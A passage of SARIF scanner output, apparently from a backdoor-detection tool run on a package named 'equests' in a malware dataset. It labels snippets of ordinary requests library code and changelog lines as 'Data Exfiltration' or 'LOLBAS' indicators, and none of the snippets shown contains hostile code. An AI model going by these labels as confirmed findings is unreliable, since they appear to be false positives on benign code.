                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/models.py"
                },
                "region": {
                  "startLine": 923,
                  "startColumn": 29,
                  "endLine": 923,
                  "endColumn": 34,
                  "snippet": {
                    "text": "    def links(self):\n        \"\"\"Returns the parsed header links of the response, if any.\"\"\"\n\n        header = self.headers.get('link')\n\n        # l = MultiDict()\n        l = {}\n",
                    "rendered": {
                      "text": "    def links(self):\n        \"\"\"Returns the parsed header links of the response, if any.\"\"\"\n\n        header = self.headers.get('link')\n\n        # l = MultiDict()\n        l = {}\n",
                      "markdown": "`    def links(self):\n        \"\"\"Returns the parsed header links of the response, if any.\"\"\"\n\n        header = self.headers.get('link')\n\n        # l = MultiDict()\n        l = {}\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/models.py"
                },
                "region": {
                  "startLine": 539,
                  "startColumn": 64,
                  "endLine": 539,
                  "endColumn": 69,
                  "snippet": {
                    "text": "                # If length exists, set it. Otherwise, we fallback\n                # to Transfer-Encoding: chunked.\n                self.headers['Content-Length'] = builtin_str(length)\n        elif self.method not in ('GET', 'HEAD') and self.headers.get('Content-Length') is None:\n            # Set Content-Length to 0 for methods that can have a body\n            # but don't provide one. (i.e. not GET or HEAD)\n            self.headers['Content-Length'] = '0'\n",
                    "rendered": {
                      "text": "                # If length exists, set it. Otherwise, we fallback\n                # to Transfer-Encoding: chunked.\n                self.headers['Content-Length'] = builtin_str(length)\n        elif self.method not in ('GET', 'HEAD') and self.headers.get('Content-Length') is None:\n            # Set Content-Length to 0 for methods that can have a body\n            # but don't provide one. (i.e. not GET or HEAD)\n            self.headers['Content-Length'] = '0'\n",
                      "markdown": "`                # If length exists, set it. Otherwise, we fallback\n                # to Transfer-Encoding: chunked.\n                self.headers['Content-Length'] = builtin_str(length)\n        elif self.method not in ('GET', 'HEAD') and self.headers.get('Content-Length') is None:\n            # Set Content-Length to 0 for methods that can have a body\n            # but don't provide one. (i.e. not GET or HEAD)\n            self.headers['Content-Length'] = '0'\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/models.py"
                },
                "region": {
                  "startLine": 285,
                  "startColumn": 24,
                  "endLine": 285,
                  "endColumn": 33,
                  "snippet": {
                    "text": "    Usage::\n\n      >>> import requests\n      >>> req = requests.Request('GET', 'https://httpbin.org/get')\n      >>> r = req.prepare()\n      >>> r\n      <PreparedRequest [GET]>\n",
                    "rendered": {
                      "text": "    Usage::\n\n      >>> import requests\n      >>> req = requests.Request('GET', 'https://httpbin.org/get')\n      >>> r = req.prepare()\n      >>> r\n      <PreparedRequest [GET]>\n",
                      "markdown": "`    Usage::\n\n      >>> import requests\n      >>> req = requests.Request('GET', 'https://httpbin.org/get')\n      >>> r = req.prepare()\n      >>> r\n      <PreparedRequest [GET]>\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/models.py"
                },
                "region": {
                  "startLine": 223,
                  "startColumn": 24,
                  "endLine": 223,
                  "endColumn": 33,
                  "snippet": {
                    "text": "    Usage::\n\n      >>> import requests\n      >>> req = requests.Request('GET', 'https://httpbin.org/get')\n      >>> req.prepare()\n      <PreparedRequest [GET]>\n    \"\"\"\n",
                    "rendered": {
                      "text": "    Usage::\n\n      >>> import requests\n      >>> req = requests.Request('GET', 'https://httpbin.org/get')\n      >>> req.prepare()\n      <PreparedRequest [GET]>\n    \"\"\"\n",
                      "markdown": "`    Usage::\n\n      >>> import requests\n      >>> req = requests.Request('GET', 'https://httpbin.org/get')\n      >>> req.prepare()\n      <PreparedRequest [GET]>\n    \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/models.py"
                },
                "region": {
                  "startLine": 400,
                  "startColumn": 78,
                  "endLine": 400,
                  "endColumn": 86,
                  "snippet": {
                    "text": "        # In general, we want to try IDNA encoding the hostname if the string contains\n        # non-ASCII characters. This allows users to automatically get the correct IDNA\n        # behaviour. For strings containing only ASCII characters, we need to also verify\n        # it doesn't start with a wildcard (*), before allowing the unencoded hostname.\n        if not unicode_is_ascii(host):\n            try:\n                host = self._get_idna_encoded_host(host)\n",
                    "rendered": {
                      "text": "        # In general, we want to try IDNA encoding the hostname if the string contains\n        # non-ASCII characters. This allows users to automatically get the correct IDNA\n        # behaviour. For strings containing only ASCII characters, we need to also verify\n        # it doesn't start with a wildcard (*), before allowing the unencoded hostname.\n        if not unicode_is_ascii(host):\n            try:\n                host = self._get_idna_encoded_host(host)\n",
                      "markdown": "`        # In general, we want to try IDNA encoding the hostname if the string contains\n        # non-ASCII characters. This allows users to automatically get the correct IDNA\n        # behaviour. For strings containing only ASCII characters, we need to also verify\n        # it doesn't start with a wildcard (*), before allowing the unencoded hostname.\n        if not unicode_is_ascii(host):\n            try:\n                host = self._get_idna_encoded_host(host)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/models.py"
                },
                "region": {
                  "startLine": 397,
                  "startColumn": 55,
                  "endLine": 397,
                  "endColumn": 63,
                  "snippet": {
                    "text": "        if not host:\n            raise InvalidURL(\"Invalid URL %r: No host supplied\" % url)\n\n        # In general, we want to try IDNA encoding the hostname if the string contains\n        # non-ASCII characters. This allows users to automatically get the correct IDNA\n        # behaviour. For strings containing only ASCII characters, we need to also verify\n        # it doesn't start with a wildcard (*), before allowing the unencoded hostname.\n",
                    "rendered": {
                      "text": "        if not host:\n            raise InvalidURL(\"Invalid URL %r: No host supplied\" % url)\n\n        # In general, we want to try IDNA encoding the hostname if the string contains\n        # non-ASCII characters. This allows users to automatically get the correct IDNA\n        # behaviour. For strings containing only ASCII characters, we need to also verify\n        # it doesn't start with a wildcard (*), before allowing the unencoded hostname.\n",
                      "markdown": "`        if not host:\n            raise InvalidURL(\"Invalid URL %r: No host supplied\" % url)\n\n        # In general, we want to try IDNA encoding the hostname if the string contains\n        # non-ASCII characters. This allows users to automatically get the correct IDNA\n        # behaviour. For strings containing only ASCII characters, we need to also verify\n        # it doesn't start with a wildcard (*), before allowing the unencoded hostname.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/models.py"
                },
                "region": {
                  "startLine": 854,
                  "startColumn": 49,
                  "endLine": 854,
                  "endColumn": 53,
                  "snippet": {
                    "text": "\n        The encoding of the response content is determined based solely on HTTP\n        headers, following RFC 2616 to the letter. If you can take advantage of\n        non-HTTP knowledge to make a better guess at the encoding, you should\n        set ``r.encoding`` appropriately before accessing this property.\n        \"\"\"\n\n",
                    "rendered": {
                      "text": "\n        The encoding of the response content is determined based solely on HTTP\n        headers, following RFC 2616 to the letter. If you can take advantage of\n        non-HTTP knowledge to make a better guess at the encoding, you should\n        set ``r.encoding`` appropriately before accessing this property.\n        \"\"\"\n\n",
                      "markdown": "`\n        The encoding of the response content is determined based solely on HTTP\n        headers, following RFC 2616 to the letter. If you can take advantage of\n        non-HTTP knowledge to make a better guess at the encoding, you should\n        set ``r.encoding`` appropriately before accessing this property.\n        \"\"\"\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/models.py"
                },
                "region": {
                  "startLine": 797,
                  "startColumn": 15,
                  "endLine": 797,
                  "endColumn": 19,
                  "snippet": {
                    "text": "    def iter_lines(self, chunk_size=ITER_CHUNK_SIZE, decode_unicode=False, delimiter=None):\n        \"\"\"Iterates over the response data, one line at a time.  When\n        stream=True is set on the request, this avoids reading the\n        content at once into memory for large responses.\n\n        .. note:: This method is not reentrant safe.\n        \"\"\"\n",
                    "rendered": {
                      "text": "    def iter_lines(self, chunk_size=ITER_CHUNK_SIZE, decode_unicode=False, delimiter=None):\n        \"\"\"Iterates over the response data, one line at a time.  When\n        stream=True is set on the request, this avoids reading the\n        content at once into memory for large responses.\n\n        .. note:: This method is not reentrant safe.\n        \"\"\"\n",
                      "markdown": "`    def iter_lines(self, chunk_size=ITER_CHUNK_SIZE, decode_unicode=False, delimiter=None):\n        \"\"\"Iterates over the response data, one line at a time.  When\n        stream=True is set on the request, this avoids reading the\n        content at once into memory for large responses.\n\n        .. note:: This method is not reentrant safe.\n        \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/models.py"
                },
                "region": {
                  "startLine": 795,
                  "startColumn": 52,
                  "endLine": 795,
                  "endColumn": 56,
                  "snippet": {
                    "text": "        return chunks\n\n    def iter_lines(self, chunk_size=ITER_CHUNK_SIZE, decode_unicode=False, delimiter=None):\n        \"\"\"Iterates over the response data, one line at a time.  When\n        stream=True is set on the request, this avoids reading the\n        content at once into memory for large responses.\n\n",
                    "rendered": {
                      "text": "        return chunks\n\n    def iter_lines(self, chunk_size=ITER_CHUNK_SIZE, decode_unicode=False, delimiter=None):\n        \"\"\"Iterates over the response data, one line at a time.  When\n        stream=True is set on the request, this avoids reading the\n        content at once into memory for large responses.\n\n",
                      "markdown": "`        return chunks\n\n    def iter_lines(self, chunk_size=ITER_CHUNK_SIZE, decode_unicode=False, delimiter=None):\n        \"\"\"Iterates over the response data, one line at a time.  When\n        stream=True is set on the request, this avoids reading the\n        content at once into memory for large responses.\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/models.py"
                },
                "region": {
                  "startLine": 741,
                  "startColumn": 48,
                  "endLine": 741,
                  "endColumn": 52,
                  "snippet": {
                    "text": "\n    def iter_content(self, chunk_size=1, decode_unicode=False):\n        \"\"\"Iterates over the response data.  When stream=True is set on the\n        request, this avoids reading the content at once into memory for\n        large responses.  The chunk size is the number of bytes it should\n        read into memory.  This is not necessarily the length of each item\n        returned as decoding can take place.\n",
                    "rendered": {
                      "text": "\n    def iter_content(self, chunk_size=1, decode_unicode=False):\n        \"\"\"Iterates over the response data.  When stream=True is set on the\n        request, this avoids reading the content at once into memory for\n        large responses.  The chunk size is the number of bytes it should\n        read into memory.  This is not necessarily the length of each item\n        returned as decoding can take place.\n",
                      "markdown": "`\n    def iter_content(self, chunk_size=1, decode_unicode=False):\n        \"\"\"Iterates over the response data.  When stream=True is set on the\n        request, this avoids reading the content at once into memory for\n        large responses.  The chunk size is the number of bytes it should\n        read into memory.  This is not necessarily the length of each item\n        returned as decoding can take place.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/models.py"
                },
                "region": {
                  "startLine": 560,
                  "startColumn": 13,
                  "endLine": 560,
                  "endColumn": 21,
                  "snippet": {
                    "text": "            # Allow auth to make its changes.\n            r = auth(self)\n\n            # Update self to reflect the auth changes.\n            self.__dict__.update(r.__dict__)\n\n            # Recompute Content-Length\n",
                    "rendered": {
                      "text": "            # Allow auth to make its changes.\n            r = auth(self)\n\n            # Update self to reflect the auth changes.\n            self.__dict__.update(r.__dict__)\n\n            # Recompute Content-Length\n",
                      "markdown": "`            # Allow auth to make its changes.\n            r = auth(self)\n\n            # Update self to reflect the auth changes.\n            self.__dict__.update(r.__dict__)\n\n            # Recompute Content-Length\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/models.py"
                },
                "region": {
                  "startLine": 892,
                  "startColumn": 71,
                  "endLine": 893,
                  "snippet": {
                    "text": "        \"\"\"\n\n        if not self.encoding and self.content and len(self.content) > 3:\n            # No encoding set. JSON RFC 4627 section 3 states we should expect\n            # UTF-8, -16 or -32. Detect which one to use; If the detection or\n            # decoding fails, fall back to `self.text` (using charset_normalizer to make\n            # a best guess).\n            encoding = guess_json_utf(self.content)\n",
                    "rendered": {
                      "text": "        \"\"\"\n\n        if not self.encoding and self.content and len(self.content) > 3:\n            # No encoding set. JSON RFC 4627 section 3 states we should expect\n            # UTF-8, -16 or -32. Detect which one to use; If the detection or\n            # decoding fails, fall back to `self.text` (using charset_normalizer to make\n            # a best guess).\n            encoding = guess_json_utf(self.content)\n",
                      "markdown": "`        \"\"\"\n\n        if not self.encoding and self.content and len(self.content) > 3:\n            # No encoding set. JSON RFC 4627 section 3 states we should expect\n            # UTF-8, -16 or -32. Detect which one to use; If the detection or\n            # decoding fails, fall back to `self.text` (using charset_normalizer to make\n            # a best guess).\n            encoding = guess_json_utf(self.content)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/models.py"
                },
                "region": {
                  "startLine": 643,
                  "startColumn": 50,
                  "endLine": 643,
                  "endColumn": 56,
                  "snippet": {
                    "text": "\n        #: The amount of time elapsed between sending the request\n        #: and the arrival of the response (as a timedelta).\n        #: This property specifically measures the time taken between sending\n        #: the first byte of the request and finishing parsing the headers. It\n        #: is therefore unaffected by consuming the response content or the\n        #: value of the ``stream`` keyword argument.\n",
                    "rendered": {
                      "text": "\n        #: The amount of time elapsed between sending the request\n        #: and the arrival of the response (as a timedelta).\n        #: This property specifically measures the time taken between sending\n        #: the first byte of the request and finishing parsing the headers. It\n        #: is therefore unaffected by consuming the response content or the\n        #: value of the ``stream`` keyword argument.\n",
                      "markdown": "`\n        #: The amount of time elapsed between sending the request\n        #: and the arrival of the response (as a timedelta).\n        #: This property specifically measures the time taken between sending\n        #: the first byte of the request and finishing parsing the headers. It\n        #: is therefore unaffected by consuming the response content or the\n        #: value of the ``stream`` keyword argument.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/models.py"
                },
                "region": {
                  "startLine": 641,
                  "startColumn": 24,
                  "endLine": 641,
                  "endColumn": 30,
                  "snippet": {
                    "text": "        #: A CookieJar of Cookies the server sent back.\n        self.cookies = cookiejar_from_dict({})\n\n        #: The amount of time elapsed between sending the request\n        #: and the arrival of the response (as a timedelta).\n        #: This property specifically measures the time taken between sending\n        #: the first byte of the request and finishing parsing the headers. It\n",
                    "rendered": {
                      "text": "        #: A CookieJar of Cookies the server sent back.\n        self.cookies = cookiejar_from_dict({})\n\n        #: The amount of time elapsed between sending the request\n        #: and the arrival of the response (as a timedelta).\n        #: This property specifically measures the time taken between sending\n        #: the first byte of the request and finishing parsing the headers. It\n",
                      "markdown": "`        #: A CookieJar of Cookies the server sent back.\n        self.cookies = cookiejar_from_dict({})\n\n        #: The amount of time elapsed between sending the request\n        #: and the arrival of the response (as a timedelta).\n        #: This property specifically measures the time taken between sending\n        #: the first byte of the request and finishing parsing the headers. It\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/api.py"
                },
                "region": {
                  "startLine": 61,
                  "startColumn": 22,
                  "endLine": 61,
                  "endColumn": 31,
                  "snippet": {
                    "text": "    # avoid leaving sockets open which can trigger a ResourceWarning in some\n    # cases, and look like a memory leak in others.\n    with sessions.Session() as session:\n        return session.request(method=method, url=url, **kwargs)\n\n\ndef get(url, params=None, **kwargs):\n",
                    "rendered": {
                      "text": "    # avoid leaving sockets open which can trigger a ResourceWarning in some\n    # cases, and look like a memory leak in others.\n    with sessions.Session() as session:\n        return session.request(method=method, url=url, **kwargs)\n\n\ndef get(url, params=None, **kwargs):\n",
                      "markdown": "`    # avoid leaving sockets open which can trigger a ResourceWarning in some\n    # cases, and look like a memory leak in others.\n    with sessions.Session() as session:\n        return session.request(method=method, url=url, **kwargs)\n\n\ndef get(url, params=None, **kwargs):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/api.py"
                },
                "region": {
                  "startLine": 52,
                  "startColumn": 24,
                  "endLine": 52,
                  "endColumn": 33,
                  "snippet": {
                    "text": "    Usage::\n\n      >>> import requests\n      >>> req = requests.request('GET', 'https://httpbin.org/get')\n      >>> req\n      <Response [200]>\n    \"\"\"\n",
                    "rendered": {
                      "text": "    Usage::\n\n      >>> import requests\n      >>> req = requests.request('GET', 'https://httpbin.org/get')\n      >>> req\n      <Response [200]>\n    \"\"\"\n",
                      "markdown": "`    Usage::\n\n      >>> import requests\n      >>> req = requests.request('GET', 'https://httpbin.org/get')\n      >>> req\n      <Response [200]>\n    \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/api.py"
                },
                "region": {
                  "startLine": 91,
                  "startColumn": 15,
                  "endLine": 91,
                  "endColumn": 21,
                  "snippet": {
                    "text": "\n\ndef head(url, **kwargs):\n    r\"\"\"Sends a HEAD request.\n\n    :param url: URL for the new :class:`Request` object.\n    :param \\*\\*kwargs: Optional arguments that ``request`` takes. If\n",
                    "rendered": {
                      "text": "\n\ndef head(url, **kwargs):\n    r\"\"\"Sends a HEAD request.\n\n    :param url: URL for the new :class:`Request` object.\n    :param \\*\\*kwargs: Optional arguments that ``request`` takes. If\n",
                      "markdown": "`\n\ndef head(url, **kwargs):\n    r\"\"\"Sends a HEAD request.\n\n    :param url: URL for the new :class:`Request` object.\n    :param \\*\\*kwargs: Optional arguments that ``request`` takes. If\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/HISTORY.md"
                },
                "region": {
                  "startLine": 1707,
                  "startColumn": 15,
                  "endLine": 1707,
                  "endColumn": 20,
                  "snippet": {
                    "text": "-   Querystrings for all methods\n-   URLErrors (Connection Refused, Timeout, Invalid URLs) are treated as\n    explicitly raised\n    `r.requests.get('hwe://blah'); r.raise_for_status()`\n\n0.4.1 (2011-05-22)\n------------------\n",
                    "rendered": {
                      "text": "-   Querystrings for all methods\n-   URLErrors (Connection Refused, Timeout, Invalid URLs) are treated as\n    explicitly raised\n    `r.requests.get('hwe://blah'); r.raise_for_status()`\n\n0.4.1 (2011-05-22)\n------------------\n",
                      "markdown": "`-   Querystrings for all methods\n-   URLErrors (Connection Refused, Timeout, Invalid URLs) are treated as\n    explicitly raised\n    `r.requests.get('hwe://blah'); r.raise_for_status()`\n\n0.4.1 (2011-05-22)\n------------------\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/HISTORY.md"
                },
                "region": {
                  "startLine": 1074,
                  "startColumn": 12,
                  "endLine": 1074,
                  "endColumn": 17,
                  "snippet": {
                    "text": "\n-   Updated CA Bundle, of course.\n-   Cookies set on individual Requests through a `Session` (e.g. via\n    `Session.get()`) are no longer persisted to the `Session`.\n-   Clean up connections when we hit problems during chunked upload,\n    rather than leaking them.\n-   Return connections to the pool when a chunked upload is successful,\n",
                    "rendered": {
                      "text": "\n-   Updated CA Bundle, of course.\n-   Cookies set on individual Requests through a `Session` (e.g. via\n    `Session.get()`) are no longer persisted to the `Session`.\n-   Clean up connections when we hit problems during chunked upload,\n    rather than leaking them.\n-   Return connections to the pool when a chunked upload is successful,\n",
                      "markdown": "`\n-   Updated CA Bundle, of course.\n-   Cookies set on individual Requests through a `Session` (e.g. via\n    `Session.get()`) are no longer persisted to the `Session`.\n-   Clean up connections when we hit problems during chunked upload,\n    rather than leaking them.\n-   Return connections to the pool when a chunked upload is successful,\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/HISTORY.md"
                },
                "region": {
                  "startLine": 1086,
                  "startColumn": 38,
                  "endLine": 1086,
                  "endColumn": 46,
                  "snippet": {
                    "text": "    type.\n-   Fix previously broken SNI support.\n-   Fix accessing HTTP proxies using proxy authentication.\n-   Unencode HTTP Basic usernames and passwords extracted from URLs.\n-   Support for IP address ranges for no\\_proxy environment variable\n-   Parse headers correctly when users override the default `Host:`\n    header.\n",
                    "rendered": {
                      "text": "    type.\n-   Fix previously broken SNI support.\n-   Fix accessing HTTP proxies using proxy authentication.\n-   Unencode HTTP Basic usernames and passwords extracted from URLs.\n-   Support for IP address ranges for no\\_proxy environment variable\n-   Parse headers correctly when users override the default `Host:`\n    header.\n",
                      "markdown": "`    type.\n-   Fix previously broken SNI support.\n-   Fix accessing HTTP proxies using proxy authentication.\n-   Unencode HTTP Basic usernames and passwords extracted from URLs.\n-   Support for IP address ranges for no\\_proxy environment variable\n-   Parse headers correctly when users override the default `Host:`\n    header.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/HISTORY.md"
                },
                "region": {
                  "startLine": 588,
                  "startColumn": 33,
                  "endLine": 588,
                  "endColumn": 41,
                  "snippet": {
                    "text": "    but do have a `seek` method.\n-   Anything that is a subclass of `Mapping` is now treated like a\n    dictionary by the `data=` keyword argument.\n-   Requests now tolerates empty passwords in proxy credentials, rather\n    than stripping the credentials.\n-   If a request is made with a file-like object as the body and that\n    request is redirected with a 307 or 308 status code, Requests will\n",
                    "rendered": {
                      "text": "    but do have a `seek` method.\n-   Anything that is a subclass of `Mapping` is now treated like a\n    dictionary by the `data=` keyword argument.\n-   Requests now tolerates empty passwords in proxy credentials, rather\n    than stripping the credentials.\n-   If a request is made with a file-like object as the body and that\n    request is redirected with a 307 or 308 status code, Requests will\n",
                      "markdown": "`    but do have a `seek` method.\n-   Anything that is a subclass of `Mapping` is now treated like a\n    dictionary by the `data=` keyword argument.\n-   Requests now tolerates empty passwords in proxy credentials, rather\n    than stripping the credentials.\n-   If a request is made with a file-like object as the body and that\n    request is redirected with a 307 or 308 status code, Requests will\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/HISTORY.md"
                },
                "region": {
                  "startLine": 251,
                  "startColumn": 4,
                  "endLine": 251,
